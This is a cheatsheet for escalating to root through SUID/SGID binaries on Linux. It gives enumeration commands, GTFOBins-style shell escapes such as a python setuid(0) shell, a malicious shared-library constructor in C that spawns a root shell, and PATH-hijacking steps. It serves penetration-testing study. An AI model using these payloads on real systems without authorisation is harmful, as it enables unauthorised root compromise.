# SUID / SGID Cheatsheet

SUID and SGID binaries are a classic Linux privilege-escalation path. The goal is to find a
binary that runs with elevated privileges and lets you influence what it executes or reads.

## 1. Find the binaries

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm -6000 -type f 2>/dev/null   # both
```

Filter out the noise:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(usr/)?(lib|lib64|snap)/'
```

## 2. Check what they are

```bash
file /path/to/binary
ls -la /path/to/binary
strings -a /path/to/binary | head -50
```

Look for:

- a shell or interpreter (`/bin/sh`, `python`, `perl`)
- a relative command name (`cp`, `tar`, `find`) that could be hijacked via `PATH`
- a config file path you can write
- a shared library loaded from a writable directory

## 3. GTFOBins workflow

1. Search the binary name on [GTFOBins](https://gtfobins.github.io/).
2. Check the **SUID** section, not the plain shell section.
3. Try the smallest payload in a lab.
4. Confirm the effective UID:

```bash
id
```

Common examples (only if the binary is actually SUID):

```bash
find . -exec /bin/sh -p \; -quit
vim -c ':!/bin/sh'
less /etc/passwd
# then: !sh
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## 4. Shared-library hijacking

Check the dynamic section:

```bash
readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /path/to/binary
```

If a binary loads a library from a relative or writable path, you may be able to replace it.
Compile a shared object with a constructor:

```c
#include <stdlib.h>
__attribute__((constructor)) void run(void) {
    setuid(0);
    setgid(0);
    system("/bin/sh -p");
}
```

```bash
gcc -shared -fPIC -o libevil.so evil.c
```

Then place it where the binary looks. `LD_PRELOAD` and `LD_LIBRARY_PATH` are ignored for
SUID binaries in secure-execution mode, so this only works when the binary itself has a
writable `RPATH`/`RUNPATH` or a missing library in a writable directory.

## 5. PATH hijacking

If a SUID binary calls another program by a relative name, it may search `PATH`:

```bash
strings -a /path/to/binary | grep -E '^[a-z]+$'
```

If you find `system("cp ...")` or `popen("tar ...")`, try placing a malicious `cp` or `tar`
earlier in `PATH`. This only works if the binary does not reset `PATH` or use an absolute
path.

## 6. Config and environment abuse

Check whether the binary reads a config file you can write:

```bash
strace -f -e trace=openat,access /path/to/binary 2>&1 | grep -E 'ENOENT|EACCES'
```

Look for:

- `~/.config/...` files owned by you
- `/etc/...` files with weak permissions
- environment variables that change the command it runs

## 7. SGID specifics

SGID gives you the binary's group, not root. It is still useful:

- read files owned by that group
- write to group-writable directories
- access sockets or devices

```bash
find / -group <group> -type f -readable 2>/dev/null
```

## 8. Known vulnerable binaries

Version-check the binary and search for public advisories:

```bash
/path/to/binary --version
searchsploit <binary name>
```

Examples of historically vulnerable SUID tools: `pkexec` (PwnKit), `sudo` (various),
`polkit`, `snap-confine`, `mount` helpers. Do not run an exploit without checking the exact
version and the kernel.

## 9. Mount options

SUID only works if the filesystem is mounted with `suid`:

```bash
mount | grep -E 'nosuid|noexec'
```

A `nosuid` mount neutralizes the bit. `noexec` blocks execution but not necessarily
interpreters reading the file.

## 10. Quick checklist

- [ ] Enumerated SUID/SGID files
- [ ] Checked each on GTFOBins
- [ ] Inspected `RPATH`/`RUNPATH` and `NEEDED` libraries
- [ ] Checked for relative command execution / `PATH` hijack
- [ ] Checked writable config files
- [ ] Checked SGID-readable files
- [ ] Verified the filesystem is not `nosuid`
- [ ] Confirmed the effective UID after exploitation
